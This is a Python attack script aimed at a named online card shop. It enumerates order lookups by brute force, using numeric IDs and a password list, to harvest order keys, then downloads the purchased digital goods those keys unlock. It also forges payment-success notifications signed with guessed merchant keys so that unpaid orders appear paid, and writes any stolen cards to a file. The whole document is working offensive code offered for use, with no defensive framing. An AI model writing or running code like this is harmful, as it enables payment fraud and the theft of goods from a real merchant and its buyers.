#!/usr/bin/env python3
"""xinhe001 full hunt without login: query pwd, numeric query, epay notify variants, ajax order skey."""
from __future__ import annotations

import hashlib
import json
import os
import re
import time
from datetime import datetime
from pathlib import Path

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
PROXY = os.environ.get("QG_TUNNEL", "")
OUT = Path(os.environ.get("XINHE_OUT", f"/workspace/results_xinhe001/hunt_{datetime.now().strftime('%Y%m%d_%H%M%S')}"))
OUT.mkdir(parents=True, exist_ok=True)
PWD_FILE = os.environ.get("PWD_FILE", "/workspace/query_pwd_list.txt")

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Referer": BASE,
            "Accept-Language": "zh-CN",
        }
    )
    return s


def log(msg: str) -> None:
    print(msg, flush=True)
    with (OUT / "progress.log").open("a", encoding="utf-8") as f:
        f.write(msg + "\n")


def epay_sign(params: dict, key: str) -> str:
    items = sorted(k for k in params if k != "sign" and params[k] != "")
    return hashlib.md5(("&".join(f"{k}={params[k]}" for k in items) + key).encode()).hexdigest()


def extract_cards(html: str) -> list[str]:
    out = []
    for m in CARD.finditer(html):
        v = m.group(1).strip()
        if len(v) > 5:
            out.append(v)
    for m in SHOW.finditer(html):
        out.append(f"showOrder({m.group(1)}, '{m.group(2)}')")
    return out


def fetch_faka(s: requests.Session, oid: str, skey: str) -> str | None:
    r = s.get(BASE, params={"mod": "faka", "id": oid, "skey": skey}, timeout=20)
    if "非发卡" in r.text:
        return None
    m = CARD.search(r.text)
    return m.group(1).strip() if m else None


def notify_variants(s: requests.Session, trade: str, money: str, site_pid: str) -> list:
    hits = []
    keys = [
        "123456", "888888", "xinhe001", "xinghe001", "xinhe", "xinghe", "faka",
        "rainbow", "epay", "mapi", "admin", "12345678", site_pid, "432", "435",
        "xinghe0010", "15E27ADA", "661C21F2CC15", "iaahtjho",
    ]
    pids = [site_pid, "432", "435", "1000", "1001", "1"]
    # Rainbow notify sign often excludes notify_url/return_url
    for key in keys:
        for pid in pids:
            for typ in ["qqpay", "alipay", "wxpay"]:
                for m in [money, "5.00", "5", "0.01"]:
                    base = {
                        "pid": pid,
                        "trade_no": f"EP{trade}",
                        "out_trade_no": trade,
                        "type": typ,
                        "name": "product",
                        "money": m,
                        "trade_status": "TRADE_SUCCESS",
                    }
                    for params in [
                        base,
                        {**base, "trade_no": trade},
                        {
                            "pid": pid,
                            "out_trade_no": trade,
                            "type": typ,
                            "name": "product",
                            "money": m,
                            "trade_status": "TRADE_SUCCESS",
                        },
                    ]:
                        params = dict(params)
                        params["sign"] = epay_sign(params, key)
                        params["sign_type"] = "MD5"
                        try:
                            rr = s.post(BASE + "other/epay_notify.php", data=params, timeout=10)
                            b = rr.text.strip()
                            if b and b not in ("error", "fail", "FAIL", "") and "_guard" not in b:
                                hits.append({"key": key, "pid": pid, "body": b[:200], "params": params})
                                log(f"NOTIFY HIT {key} {pid} {b[:80]}")
                        except Exception:
                            pass
    return hits


def main() -> None:
    report = {
        "target": "xinhe001.lol",
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "CARD_LEAK": False,
        "cards": [],
        "pairs": {},
        "pwd_hits": [],
        "notify_hits": [],
    }
    s = session()
    s.get(BASE, timeout=30)
    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20).json()
    report["getcount"] = gc
    site_pid = str(gc.get("site", "435"))
    log(f"orders={gc.get('orders')} site={site_pid}")

    pairs: dict[str, str] = {}
    cards: list[str] = []

    # mod=query numeric 0-999
    for i in range(1000):
        q = f"{i:03d}" if i >= 100 else (f"{i:02d}" if i >= 10 else str(i))
        try:
            r = s.get(BASE, params={"mod": "query", "data": q}, timeout=14)
            for m in SHOW.finditer(r.text):
                pairs[m.group(1)] = m.group(2)
        except Exception:
            s.get(BASE, timeout=20)
        if i % 100 == 0:
            log(f"query numeric {i} pairs={len(pairs)}")
        time.sleep(0.25)

    # pwd list ajax query + mod=query
    pwds = []
    if os.path.isfile(PWD_FILE):
        with open(PWD_FILE, encoding="utf-8") as f:
            pwds = [x.strip() for x in f if x.strip()][:200]
    for pwd in pwds:
        try:
            rg = s.get(BASE, params={"mod": "query", "data": pwd}, timeout=14)
            so = SHOW.findall(rg.text)
            if so:
                report["pwd_hits"].append({"pwd": pwd, "mod_query": so[:5]})
                for oid, sk in so:
                    pairs[oid] = sk
                log(f"PWD mod_query {pwd} {so[:2]}")
            for typ in range(6):
                rp = s.post(
                    BASE + "ajax.php?act=query",
                    data={"type": str(typ), "content": pwd, "pwd": pwd},
                    timeout=14,
                )
                if SHOW.search(rp.text) or CARD.search(rp.text):
                    report["pwd_hits"].append({"pwd": pwd, "type": typ, "ajax": rp.text[:300]})
                    for oid, sk in SHOW.findall(rp.text):
                        pairs[oid] = sk
                    cards.extend(extract_cards(rp.text))
        except Exception:
            pass
        time.sleep(0.3)

    report["pairs"] = pairs
    log(f"total pairs {len(pairs)}")

    for oid, sk in pairs.items():
        card = fetch_faka(s, oid, sk)
        if card:
            cards.append(card)
            log(f"CARD {oid} {card[:80]}")
        time.sleep(0.3)

    # notify on known unpaid trades
    trades = [
        "20260802070155999", "20260802070516752", "20260802071949639",
        "20260802071939158", "20260802071949639",
    ]
    for trade in trades:
        nh = notify_variants(s, trade, "5.00", site_pid)
        if nh:
            report["notify_hits"].extend(nh)
            gs = s.get(BASE + "other/getshop.php", params={"trade_no": trade}, timeout=12)
            if "未付款" not in gs.text:
                log(f"getshop after notify {trade} {gs.text[:100]}")
                cards.extend(extract_cards(gs.text))

    if cards:
        report["CARD_LEAK"] = True
        report["cards"] = list(dict.fromkeys(cards))
        (OUT / "cards.txt").write_text("\n".join(report["cards"]), encoding="utf-8")

    (OUT / "report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    log(f"DONE CARD_LEAK={report['CARD_LEAK']} cards={len(report.get('cards', []))}")


if __name__ == "__main__":
    main()
